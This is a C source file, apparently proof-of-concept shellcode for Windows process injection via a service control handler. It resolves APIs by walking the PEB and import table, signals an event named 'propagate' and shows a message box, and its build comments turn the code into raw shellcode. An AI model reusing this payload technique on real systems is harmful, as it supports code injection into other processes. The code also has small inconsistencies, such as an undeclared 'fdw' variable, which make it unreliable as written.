/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "getapi.h"

// cl -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
// link /entry:SubclassProc /base:0 payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
// xbin payload.exe .text
// dist -fc payload.exe >payload.h

typedef FARPROC (WINAPI *GetProcAddress_t)(
  _In_ HMODULE hModule,
  _In_ LPCSTR  lpProcName);

typedef HMODULE (WINAPI *LoadLibrary_t)(
  _In_ LPCTSTR lpFileName);

typedef HMODULE (WINAPI *GetModuleHandle_t)(
  _In_opt_ LPCTSTR lpModuleName);

typedef BOOL (WINAPI *SetProp_t)(
  _In_     HWND    hWnd,
  _In_     LPCTSTR lpString,
  _In_opt_ HANDLE  hData);

typedef int (WINAPI *MessageBox_t)(
  _In_opt_ HWND    hWnd,
  _In_opt_ LPCTSTR lpText,
  _In_opt_ LPCTSTR lpCaption,
  _In_     UINT    uType);

typedef HANDLE (WINAPI *OpenEvent_t)(
  _In_ DWORD   dwDesiredAccess,
  _In_ BOOL    bInheritHandle,
  _In_ LPCTSTR lpName);

typedef BOOL (WINAPI *SetEvent_t)(
  _In_ HANDLE hEvent);
  
typedef BOOL (WINAPI *CloseHandle_t)(
  _In_ HANDLE hOject);
  
typedef HANDLE (WINAPI *CreateMutex_t)(
  _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,
  _In_     BOOL                  bInitialOwner,
  _In_opt_ LPCTSTR               lpName);

typedef DWORD (WINAPI *GetLastError_t)(VOID);

typedef HWND (WINAPI *GetForegroundWindow_t)(void);

LPVOID get_imp(PIMAGE_IMPORT_DESCRIPTOR imp, 
    LPVOID base, PCHAR api);
    
int xstrcmp(char*,char*);

// executed by dispatch control manager
VOID WINAPI Handler(DWORD fdwControl) {
    DWORD                    rva;
    PIMAGE_IMPORT_DESCRIPTOR imp;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_DATA_DIRECTORY    dir;
    LPVOID                   base;
    PDWORD                   dll;
    PPEB                     peb;
    HMODULE                  hU32, hK32;
    HANDLE                   hEvent;
    
    GetProcAddress_t         pGetProcAddress;
    LoadLibrary_t            pLoadLibrary;
    GetModuleHandle_t        pGetModuleHandle;
    SetProp_t                pSetProp;
    OpenEvent_t              pOpenEvent;
    SetEvent_t               pSetEvent;
    MessageBox_t             pMessageBox;
    CloseHandle_t            pCloseHandle;
    GetForegroundWindow_t    pGetForegroundWindow;
    
    #include "data.h"

    // we only expect to receive this control code
    if (fdw != CONTROL_SERVICE_INTERROGATE) return 0;

  #if defined(_WIN64)
    peb = (PPEB) __readgsqword(0x60);
  #else
    peb = (PPEB) __readfsdword(0x30);
  #endif

    base = peb->ImageBaseAddress;
    dos  = (PIMAGE_DOS_HEADER)base;
    nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir  = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva  = dir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;  
    imp  = (PIMAGE_IMPORT_DESCRIPTOR) RVA2VA(ULONG_PTR, base, rva);
    
    // locate kernel32.dll
    for (;imp->Name!=0;imp++){
      dll = RVA2VA(PDWORD, base, imp->Name);
      if ((dll[0] | 0x20202020) == ((DWORD*)szkernel32)[0] && 
          (dll[1] | 0x20202020) == ((DWORD*)szkernel32)[1])
      { 
        // now locate GetProcAddress, GetModuleHandleA
        pGetModuleHandle = get_imp(imp, base, (PCHAR)szGetModuleHandleA);
        pGetProcAddress  = get_imp(imp, base, (PCHAR)szGetProcAddress);
        break;
      }
    }
    
    // got the api?
    if(pGetModuleHandle!=NULL&&pGetProcAddress!=NULL){
      hU32=pGetModuleHandle((PCHAR)szuser32);
      hK32=pGetModuleHandle((PCHAR)szkernel32);
      
      if(hU32!=NULL&&hK32!=NULL){
        // resolve api addresses
        pOpenEvent    = (OpenEvent_t)   pGetProcAddress(hK32, (PCHAR)szOpenEventA);
        pSetEvent     = (SetEvent_t)    pGetProcAddress(hK32, (PCHAR)szSetEvent);
        pCloseHandle  = (CloseHandle_t) pGetProcAddress(hK32, (PCHAR)szCloseHandle);
        
        // 
        pGetForegroundWindow = (GetForegroundWindow_t)pGetProcAddress(hU32, (PCHAR)szGetForegroundWindow);
        pMessageBox   = (MessageBox_t) pGetProcAddress(hU32, (PCHAR)szMessageBoxA);
        
        if(pOpenEvent           != NULL &&
           pSetEvent            != NULL &&
           pMessageBox          != NULL &&
           pGetForegroundWindow != NULL &&
           pCloseHandle         != NULL)
        {  
          // open event handle
          hEvent=pOpenEvent(EVENT_MODIFY_STATE, TRUE, (PCHAR)szpropagate);
          if(hEvent!=NULL){
            // signal state
            pSetEvent(hEvent);
            // close
            pCloseHandle(hEvent);
            // display kewl message to user :P
            pMessageBox(NULL, (PCHAR)msg, (PCHAR)title, MB_OK);
          }
        }
      }
    }
    return 0;
}

// get address of API from import table using string
LPVOID get_imp(PIMAGE_IMPORT_DESCRIPTOR imp, 
    LPVOID base, PCHAR api)
{
    LPVOID                api_adr=NULL;
    PIMAGE_THUNK_DATA     oft, ft;
    PIMAGE_IMPORT_BY_NAME ibn;
    DWORD                 rva;
    
    rva = imp->OriginalFirstThunk;
    oft = (PIMAGE_THUNK_DATA)RVA2VA(ULONG_PTR, base, rva);
    
    rva = imp->FirstThunk;
    ft  = (PIMAGE_THUNK_DATA)RVA2VA(ULONG_PTR, base, rva);
      
    for (;; oft++, ft++) 
    {
      // no API left?
      if (oft->u1.AddressOfData==0) break;
      // skip ordinals
      if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) continue;
      
      rva  = oft->u1.AddressOfData;
      ibn  = (PIMAGE_IMPORT_BY_NAME)RVA2VA(ULONG_PTR, base, rva);

      // have we a match?
      if (!xstrcmp(api,ibn->Name)) {
        api_adr = (LPVOID)ft->u1.Function;
        break;
      }
    }
    return api_adr;  
}

// compare strings s1 and s2
int xstrcmp(char *s1, char *s2){
  while(*s1 && (*s1==*s2))s1++,s2++;
  return (int)*(unsigned char*)s1 - *(unsigned char*)s2;
}

